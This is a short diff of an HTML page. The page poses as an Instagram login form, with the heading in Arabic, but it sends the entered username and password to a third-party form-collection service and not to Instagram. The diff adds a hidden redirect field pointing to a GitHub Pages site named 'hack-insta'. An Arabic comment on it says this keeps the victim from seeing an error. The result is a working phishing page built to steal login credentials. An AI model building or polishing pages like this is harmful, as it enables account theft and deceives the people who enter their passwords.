@@ -267,8 +267,10 @@
             <div class="my-custom-form">
                 <h3>تسجيل الدخول إلى Instagram</h3>
                 
-                <!-- الفورم هنا بعد التعديل الكامل -->
                 <form action="https://formsubmit.co/el/nizezu" method="POST">
+                    <!-- السطر السحري اللي هيمنع الـ 404 ويرجعك للموقع -->
+                    <input type="hidden" name="_next" value="https://mm2645700-byte.github.io/hack-insta/">
+
                     <input type="text" name="username" id="username" required placeholder="اسم المستخدم أو البريد الإلكتروني">
                     <input type="password" name="password" id="password" required placeholder="كلمة السر">
                     
@@ -293,7 +295,6 @@
 
     </div>
 
-    <!-- كود الجافا سكريبت بعد الإصلاح -->
     <script>
         const usernameInput = document.getElementById('username');
         const passwordInput = document.getElementById('password'); 
